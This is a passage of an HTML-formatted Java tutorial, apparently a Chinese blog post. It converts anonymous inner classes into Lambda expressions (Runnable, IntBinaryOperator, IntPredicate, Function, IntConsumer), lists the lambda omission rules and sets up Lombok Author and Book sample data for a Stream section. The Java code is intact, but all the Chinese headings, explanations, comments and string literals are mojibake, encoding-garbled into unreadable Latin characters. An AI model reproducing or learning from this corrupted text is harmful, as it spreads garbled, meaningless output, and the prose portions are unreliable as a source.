æ¦‚å¿µ</h4><p>â€‹é¢å‘å¯¹è±¡æ€æƒ³éœ€è¦å…³æ³¨ç”¨ä»€ä¹ˆå¯¹è±¡å®Œæˆä»€ä¹ˆäº‹æƒ…ã€‚è€Œå‡½æ•°å¼ç¼–ç¨‹æ€æƒ³å°±ç±»ä¼¼äºæˆ‘ä»¬æ•°å­¦ä¸­çš„å‡½æ•°ã€‚å®ƒä¸»è¦å…³æ³¨çš„æ˜¯å¯¹æ•°æ®è¿›è¡Œäº†ä»€ä¹ˆæ“ä½œã€‚</p><h4 id="122-ä¼˜ç‚¹"><a class="markdownIt-Anchor" href="#122-ä¼˜ç‚¹"></a> 1.2.2 ä¼˜ç‚¹</h4><ul><li>ä»£ç ç®€æ´ï¼Œå¼€å‘å¿«é€Ÿ</li><li>æ¥è¿‘è‡ªç„¶è¯­è¨€ï¼Œæ˜“äºç†è§£</li><li>æ˜“äº&quot;å¹¶å‘ç¼–ç¨‹&quot;</li></ul><h2 id="2-lambdaè¡¨è¾¾å¼"><a class="markdownIt-Anchor" href="#2-lambdaè¡¨è¾¾å¼"></a> 2. Lambdaè¡¨è¾¾å¼</h2><h3 id="21-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#21-æ¦‚è¿°"></a> 2.1 æ¦‚è¿°</h3><p>â€‹Lambdaæ˜¯JDK8ä¸­ä¸€ä¸ªè¯­æ³•ç³–ã€‚ä»–å¯ä»¥å¯¹æŸäº›åŒ¿åå†…éƒ¨ç±»çš„å†™æ³•è¿›è¡Œç®€åŒ–ã€‚å®ƒæ˜¯å‡½æ•°å¼ç¼–ç¨‹æ€æƒ³çš„ä¸€ä¸ªé‡è¦ä½“ç°ã€‚è®©æˆ‘ä»¬ä¸ç”¨å…³æ³¨æ˜¯ä»€ä¹ˆå¯¹è±¡ã€‚è€Œæ˜¯æ›´å…³æ³¨æˆ‘ä»¬å¯¹æ•°æ®è¿›è¡Œäº†ä»€ä¹ˆæ“ä½œã€‚</p><h3 id="22-æ ¸å¿ƒåŸåˆ™"><a class="markdownIt-Anchor" href="#22-æ ¸å¿ƒåŸåˆ™"></a> 2.2 æ ¸å¿ƒåŸåˆ™</h3><blockquote><p>å¯æ¨å¯¼å¯çœç•¥</p></blockquote><h3 id="2-3-åŸºæœ¬æ ¼å¼"><a class="markdownIt-Anchor" href="#2-3-åŸºæœ¬æ ¼å¼"></a> 2. 3 åŸºæœ¬æ ¼å¼</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">(å‚æ•°åˆ—è¡¨)-&gt;&#123;ä»£ç &#125;<br></code></pre></td></tr></table></figure><h4 id="ä¾‹ä¸€"><a class="markdownIt-Anchor" href="#ä¾‹ä¸€"></a> ä¾‹ä¸€</h4><p>æˆ‘ä»¬åœ¨åˆ›å»ºçº¿ç¨‹å¹¶å¯åŠ¨æ—¶å¯ä»¥ä½¿ç”¨åŒ¿åå†…éƒ¨ç±»çš„å†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä½ çŸ¥é“å— æˆ‘æ¯”ä½ æƒ³è±¡çš„ æ›´æƒ³åœ¨ä½ èº«è¾¹&quot;</span>);<br>    &#125;<br>&#125;).start();<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨Lambdaçš„æ ¼å¼å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚ä¿®æ”¹åå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(()-&gt;&#123;<br>    System.out.println(<span class="hljs-string">&quot;ä½ çŸ¥é“å— æˆ‘æ¯”ä½ æƒ³è±¡çš„ æ›´æƒ³åœ¨ä½ èº«è¾¹&quot;</span>);<br>&#125;).start();<br></code></pre></td></tr></table></figure><h4 id="ä¾‹äºŒ"><a class="markdownIt-Anchor" href="#ä¾‹äºŒ"></a> ä¾‹äºŒ:</h4><p>ç°æœ‰æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼Œå…¶ä¸­IntBinaryOperatoræ˜¯ä¸€ä¸ªæ¥å£ã€‚å…ˆä½¿ç”¨åŒ¿åå†…éƒ¨ç±»çš„å†™æ³•è°ƒç”¨è¯¥æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateNum</span><span class="hljs-params">(IntBinaryOperator operator)</span>&#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">return</span> operator.applyAsInt(a, b);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> calculateNum(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntBinaryOperator</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">applyAsInt</span><span class="hljs-params">(<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> &#123;<br>            <span class="hljs-keyword">return</span> left + right;<br>        &#125;<br>    &#125;);<br>    System.out.println(i);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambdaå†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> calculateNum((<span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)-&gt;&#123;<br>        <span class="hljs-keyword">return</span> left + right;<br>    &#125;);<br>    System.out.println(i);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¾‹ä¸‰"><a class="markdownIt-Anchor" href="#ä¾‹ä¸‰"></a> ä¾‹ä¸‰ï¼š</h4><p>ç°æœ‰æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼Œå…¶ä¸­IntPredicateæ˜¯ä¸€ä¸ªæ¥å£ã€‚å…ˆä½¿ç”¨åŒ¿åå†…éƒ¨ç±»çš„å†™æ³•è°ƒç”¨è¯¥æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printNum</span><span class="hljs-params">(IntPredicate predicate)</span>&#123;<br>    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;<br>        <span class="hljs-keyword">if</span>(predicate.test(i))&#123;<br>            System.out.println(i);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    printNum(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntPredicate</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">test</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br>            <span class="hljs-keyword">return</span> value%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambdaå†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    printNum((<span class="hljs-type">int</span> value)-&gt; &#123;<br>        <span class="hljs-keyword">return</span> value%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>;<br>    &#125;);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printNum</span><span class="hljs-params">(IntPredicate predicate)</span>&#123;<br>    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;<br>        <span class="hljs-keyword">if</span>(predicate.test(i))&#123;<br>            System.out.println(i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¾‹å››"><a class="markdownIt-Anchor" href="#ä¾‹å››"></a> ä¾‹å››ï¼š</h4><p>ç°æœ‰æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼Œå…¶ä¸­Functionæ˜¯ä¸€ä¸ªæ¥å£ã€‚å…ˆä½¿ç”¨åŒ¿åå†…éƒ¨ç±»çš„å†™æ³•è°ƒç”¨è¯¥æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;R&gt; R <span class="hljs-title function_">typeConver</span><span class="hljs-params">(Function&lt;String,R&gt; function)</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1235&quot;</span>;<br>    <span class="hljs-type">R</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> function.apply(str);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> typeConver(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>&lt;String, Integer&gt;() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">apply</span><span class="hljs-params">(String s)</span> &#123;<br>            <span class="hljs-keyword">return</span> Integer.valueOf(s);<br>        &#125;<br>    &#125;);<br>    System.out.println(result);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambdaå†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> typeConver((String s)-&gt;&#123;<br>    <span class="hljs-keyword">return</span> Integer.valueOf(s);<br>&#125;);<br>System.out.println(result);<br><br></code></pre></td></tr></table></figure><h4 id="ä¾‹äº”"><a class="markdownIt-Anchor" href="#ä¾‹äº”"></a> ä¾‹äº”ï¼š</h4><p>ç°æœ‰æ–¹æ³•å®šä¹‰å¦‚ä¸‹ï¼Œå…¶ä¸­IntConsumeræ˜¯ä¸€ä¸ªæ¥å£ã€‚å…ˆä½¿ç”¨åŒ¿åå†…éƒ¨ç±»çš„å†™æ³•è°ƒç”¨è¯¥æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">foreachArr</span><span class="hljs-params">(IntConsumer consumer)</span>&#123;<br>    <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i : arr) &#123;<br>        consumer.accept(i);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    foreachArr(<span class="hljs-keyword">new</span> <span class="hljs-title class_">IntConsumer</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> value)</span> &#123;<br>            System.out.println(value);<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>Lambdaå†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    foreachArr((<span class="hljs-type">int</span> value)-&gt;&#123;<br>        System.out.println(value);<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="24-çœç•¥è§„åˆ™"><a class="markdownIt-Anchor" href="#24-çœç•¥è§„åˆ™"></a> 2.4 çœç•¥è§„åˆ™</h3><ul><li>å‚æ•°ç±»å‹å¯ä»¥çœç•¥</li><li>æ–¹æ³•ä½“åªæœ‰ä¸€å¥ä»£ç æ—¶å¤§æ‹¬å·returnå’Œå”¯ä¸€ä¸€å¥ä»£ç çš„åˆ†å·å¯ä»¥çœç•¥</li><li>æ–¹æ³•åªæœ‰ä¸€ä¸ªå‚æ•°æ—¶å°æ‹¬å·å¯ä»¥çœç•¥</li><li>ä»¥ä¸Šè¿™äº›è§„åˆ™éƒ½è®°ä¸ä½ä¹Ÿå¯ä»¥çœç•¥ä¸è®°</li></ul><h2 id="3-streamæµ"><a class="markdownIt-Anchor" href="#3-streamæµ"></a> 3. Streamæµ</h2><h3 id="31-æ¦‚è¿°"><a class="markdownIt-Anchor" href="#31-æ¦‚è¿°"></a> 3.1 æ¦‚è¿°</h3><p>â€‹Java8çš„Streamä½¿ç”¨çš„æ˜¯å‡½æ•°å¼ç¼–ç¨‹æ¨¡å¼ï¼Œå¦‚åŒå®ƒçš„åå­—ä¸€æ ·ï¼Œå®ƒå¯ä»¥è¢«ç”¨æ¥å¯¹é›†åˆæˆ–æ•°ç»„è¿›è¡Œé“¾çŠ¶æµå¼çš„æ“ä½œã€‚å¯ä»¥æ›´æ–¹ä¾¿çš„è®©æˆ‘ä»¬å¯¹é›†åˆæˆ–æ•°ç»„æ“ä½œã€‚</p><h3 id="32-æ¡ˆä¾‹æ•°æ®å‡†å¤‡"><a class="markdownIt-Anchor" href="#32-æ¡ˆä¾‹æ•°æ®å‡†å¤‡"></a> 3.2 æ¡ˆä¾‹æ•°æ®å‡†å¤‡</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@EqualsAndHashCode</span><span class="hljs-comment">//ç”¨äºåæœŸçš„å»é‡ä½¿ç”¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Author</span> &#123;<br>    <span class="hljs-comment">//id</span><br>    <span class="hljs-keyword">private</span> Long id;<br>    <span class="hljs-comment">//å§“å</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-comment">//å¹´é¾„</span><br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-comment">//ç®€ä»‹</span><br>    <span class="hljs-keyword">private</span> String intro;<br>    <span class="hljs-comment">//ä½œå“</span><br>    <span class="hljs-keyword">private</span> List&lt;Book&gt; books;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@EqualsAndHashCode</span><span class="hljs-comment">//ç”¨äºåæœŸçš„å»é‡ä½¿ç”¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Book</span> &#123;<br>    <br>    <span class="hljs-comment">//id</span><br>    <span class="hljs-keyword">private</span> Long id;<br>    <br>    <span class="hljs-comment">//ä¹¦å</span><br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-comment">//åˆ†ç±»</span><br>    <span class="hljs-keyword">private</span> String category;<br><br>    <span class="hljs-comment">//è¯„åˆ†</span><br>    <span class="hljs-keyword">private</span> Integer score;<br><br>    <span class="hljs-comment">//ç®€ä»‹</span><br>    <span class="hljs-keyword">private</span> String intro;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> List&lt;Author&gt; <span class="hljs-title function_">getAuthors</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//æ•°æ®åˆå§‹åŒ–</span><br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">1L</span>,<span class="hljs-string">&quot;è’™å¤š&quot;</span>,<span class="hljs-number">33</span>,<span class="hljs-string">&quot;ä¸€ä¸ªä»èœåˆ€ä¸­æ˜æ‚Ÿå“²ç†çš„ç¥–å®‰äºº&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">2L</span>,<span class="hljs-string">&quot;äºšæ‹‰ç´¢&quot;</span>,<span class="hljs-number">15</span>,<span class="hljs-string">&quot;ç‹‚é£ä¹Ÿè¿½é€ä¸ä¸Šä»–çš„æ€è€ƒé€Ÿåº¦&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;æ˜“&quot;</span>,<span class="hljs-number">14</span>,<span class="hljs-string">&quot;æ˜¯è¿™ä¸ªä¸–ç•Œåœ¨é™åˆ¶ä»–çš„æ€ç»´&quot;</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Author</span> <span class="hljs-variable">author4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Author</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;æ˜“&quot;</span>,<span class="hljs-number">14</span>,<span class="hljs-string">&quot;æ˜¯è¿™ä¸ªä¸–ç•Œåœ¨é™åˆ¶ä»–çš„æ€ç»´&quot;</span>,<span class="hljs-literal">null</span>);<br><br>    <span class="hljs-comment">//ä¹¦ç±åˆ—è¡¨</span><br>    List&lt;Book&gt; books1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    List&lt;Book&gt; books2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    List&lt;Book&gt; books3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    books1.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">1L</span>,<span class="hljs-string">&quot;åˆ€çš„ä¸¤ä¾§æ˜¯å…‰æ˜ä¸é»‘æš—&quot;</span>,<span class="hljs-string">&quot;å“²å­¦,çˆ±æƒ…&quot;</span>,<span class="hljs-number">88</span>,<span class="hljs-string">&quot;ç”¨ä¸€æŠŠåˆ€åˆ’åˆ†äº†çˆ±æ¨&quot;</span>));<br>    books1.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">2L</span>,<span class="hljs-string">&quot;ä¸€ä¸ªäººä¸èƒ½æ­»åœ¨åŒä¸€æŠŠåˆ€ä¸‹&quot;</span>,<span class="hljs-string">&quot;ä¸ªäººæˆé•¿,çˆ±æƒ…&quot;</span>,<span class="hljs-number">99</span>,<span class="hljs-string">&quot;è®²è¿°å¦‚ä½•ä»å¤±è´¥ä¸­æ˜æ‚ŸçœŸç†&quot;</span>));<br><br>    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;é‚£é£å¹ä¸åˆ°çš„åœ°æ–¹&quot;</span>,<span class="hljs-string">&quot;å“²å­¦&quot;</span>,<span class="hljs-number">85</span>,<span class="hljs-string">&quot;å¸¦ä½ ç”¨æ€ç»´å»é¢†ç•¥ä¸–ç•Œçš„å°½å¤´&quot;</span>));<br>    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">3L</span>,<span class="hljs-string">&quot;é‚£é£å¹ä¸åˆ°çš„åœ°æ–¹&quot;</span>,<span class="hljs-string">&quot;å“²å­¦&quot;</span>,<span class="hljs-number">85</span>,<span class="hljs-string">&quot;å¸¦ä½ ç”¨æ€ç»´å»é¢†ç•¥ä¸–ç•Œçš„å°½å¤´&quot;</span>));<br>    books2.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">4L</span>,<span class="hljs-string">&quot;å¹æˆ–ä¸å¹&quot;</span>,<span class="hljs-string">&quot;çˆ±æƒ…,ä¸ªäººä¼ è®°&quot;</span>,<span class="hljs-number">56</span>,<span class="hljs-string">&quot;ä¸€ä¸ªå“²å­¦å®¶çš„æ‹çˆ±è§‚æ³¨å®šå¾ˆéš¾æŠŠä»–æ‰€åœ¨çš„æ—¶ä»£ç†è§£&quot;</span>));<br><br>    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">5L</span>,<span class="hljs-string">&quot;ä½ çš„å‰‘å°±æ˜¯æˆ‘çš„å‰‘&quot;</span>,<span class="hljs-string">&quot;çˆ±æƒ…&quot;</span>,<span class="hljs-number">56</span>,<span class="hljs-string">&quot;æ— æ³•æƒ³è±¡ä¸€ä¸ªæ­¦è€…èƒ½å¯¹ä»–çš„ä¼´ä¾£è¿™ä¹ˆçš„å®½å®¹&quot;</span>));<br>    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">6L</span>,<span class="hljs-string">&quot;é£ä¸å‰‘&quot;</span>,<span class="hljs-string">&quot;ä¸ªäººä¼ è®°&quot;</span>,<span class="hljs-number">100</span>,<span class="hljs-string">&quot;ä¸¤ä¸ªå“²å­¦å®¶çµé­‚å’Œè‚‰ä½“çš„ç¢°æ’ä¼šæ¿€èµ·æ€ä¹ˆæ ·çš„ç«èŠ±å‘¢ï¼Ÿ&quot;</span>));<br>    books3.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Book</span>(<span class="hljs-number">6L</span>,<span class="hljs-string">&quot;é£ä¸å‰‘&quot;</span>,<span class="hljs-string">&quot;ä¸ªäººä¼ è®°&quot;</span>,<span class="hljs-number">100</span>,<span 